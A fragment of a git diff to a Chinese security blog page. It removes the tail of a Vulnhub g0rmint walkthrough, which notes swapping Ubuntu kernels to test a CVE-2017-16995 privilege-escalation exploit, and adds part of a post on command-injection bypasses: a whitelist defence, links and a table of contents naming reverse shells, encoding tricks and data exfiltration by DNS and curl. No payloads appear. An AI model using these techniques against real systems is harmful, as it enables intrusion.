-<p>这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行</p>
-<p>但这个过程中利用到了更换Linux内核，有必要在这里记录一下</p>
-</blockquote>
-<ol>
-<li>uname -r 查看系统默认内核</li>
-<li>apt-cache search linux 查看可获取的内核</li>
-<li>sudo apt-get install linux-headers-4.4.0-62-generic linux-image-4.4.0-62-generic    安装所需要版本的内核，注意:这一步需要下载两个东西，”headers”和”image”，不能只安装其中一个</li>
-<li>sudo gedit /boot/grub/grub.cfg 修改内核配置信息</li>
-</ol>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/更换内核.png" width="700" height>
-
-<p>保存后重启即可</p>
-<p>参考文章:</p>
-<p><a href="http://blog.nsfocus.net/cve-2017-16995-ubuntu/" target="_blank" rel="noopener">【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995</a></p>
-<p><a href="https://www.cnblogs.com/williamjie/p/10723919.html" target="_blank" rel="noopener">ubuntu如何安装或更换内核</a></p>
-<p><a href="https://blog.csdn.net/weixin_44003563/article/details/90261833" target="_blank" rel="noopener">Ubuntu下更换内核详细步骤（亲测有效）</a></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
-<li><a href="https://xz.aliyun.com/t/2860#toc-3" target="_blank" rel="noopener">记一次在实战靶机中使用SearchSploit的总结</a></li>
-<li><a href="https://xz.aliyun.com/t/2753" target="_blank" rel="noopener">Vulnhub-g0rmint</a></li>
-<li><a href="https://blog.csdn.net/qq_33438733/article/details/82874685" target="_blank" rel="noopener">带妹玩转Vulnhub【二】</a></li>
-<li><a href="http://www.myh0st.cn/index.php/archives/67/" target="_blank" rel="noopener">msf生成常用payload</a></li>
-<li><a href="https://xz.aliyun.com/t/2860#toc-3" target="_blank" rel="noopener">记一次在实战靶机中使用SearchSploit的总结</a></li>
+<h3 id="参数白名单"><a href="#参数白名单" class="headerlink" title="参数白名单"></a>参数白名单</h3><p>直接在代码或配置文件中限定某些参数，使用时候匹配一下这个参数是否不再这个白名单，如果不在则直接显示错误提示。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
+<li><p><a href="https://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
+</li>
+<li><p><a href="http://www.admintony.com/无回显代码执行利用方法.html" target="_blank" rel="noopener">无回显代码执行利用方法</a></p>
+</li>
+<li><p><a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">命令执行的一些绕过技巧</a></p>
+</li>
+<li><p><a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">ctf命令执行与绕过</a></p>
+</li>
+<li><p><a href="https://blog.zeddyu.info/2019/01/17/命令执行/" target="_blank" rel="noopener">巧用命令注入的N种方式</a></p>
+</li>
+<li><p><a href="https://cloud.tencent.com/developer/article/1148417" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/JBlock/article/details/88311388#Think_one_Think_792" target="_blank" rel="noopener">CTF命令执行及绕过技巧</a></p>
+</li>
 </ol>
 
       
@@ -701,11 +728,9 @@
         
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
           
-            <a href="/tags/提权/" rel="tag"># 提权</a>
-          
-            <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+            <a href="/tags/命令执行漏洞/" rel="tag"># 命令执行漏洞</a>
           
         </div>
       
@@ -718,8 +743,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/10/Raven2/" rel="next" title="Raven2渗透实战">
-                <i class="fa fa-chevron-left"></i> Raven2渗透实战
+              <a href="/2019/08/16/windows2008_1/" rel="next" title="windows2008渗透测试（一）">
+                <i class="fa fa-chevron-left"></i> windows2008渗透测试（一）
               </a>
             
           </div>
@@ -728,8 +753,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/10/Lampiao/" rel="prev" title="Lampiao渗透实战">
-                Lampiao渗透实战 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/27/使用MSF进行跳板攻击/" rel="prev" title="使用MSF进行跳板">
+                使用MSF进行跳板 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -891,7 +916,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#主机发现"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web信息收集"><span class="nav-number">2.3.</span> <span class="nav-text">Web信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码审计"><span class="nav-number">2.4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">2.5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">2.6.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#杂记"><span class="nav-number">3.</span> <span class="nav-text">杂记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行漏洞"><span class="nav-number">2.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行几种方式"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行几种方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行绕过技巧"><span class="nav-number">3.</span> <span class="nav-text">命令执行绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格绕过"><span class="nav-number">3.1.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令连接符"><span class="nav-number">3.2.</span> <span class="nav-text">命令连接符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">3.3.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#变量拼接"><span class="nav-number">3.3.1.</span> <span class="nav-text">变量拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码"><span class="nav-number">3.3.2.</span> <span class="nav-text">base64编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#十六进制编码"><span class="nav-number">3.3.3.</span> <span class="nav-text">十六进制编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单、双引号"><span class="nav-number">3.3.4.</span> <span class="nav-text">单、双引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反斜线"><span class="nav-number">3.3.5.</span> <span class="nav-text">反斜线</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显的命令执行"><span class="nav-number">3.4.</span> <span class="nav-text">无回显的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">3.4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">3.4.2.</span> <span class="nav-text">DNSLOG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl上传文件"><span class="nav-number">3.4.3.</span> <span class="nav-text">curl上传文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#短命令执行"><span class="nav-number">3.5.</span> <span class="nav-text">短命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP绕过"><span class="nav-number">3.6.</span> <span class="nav-text">IP绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞防范"><span class="nav-number">4.</span> <span class="nav-text">漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令防注入函数"><span class="nav-number">4.1.</span> <span class="nav-text">命令防注入函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参数白名单"><span class="nav-number">4.2.</span> <span class="nav-text">参数白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
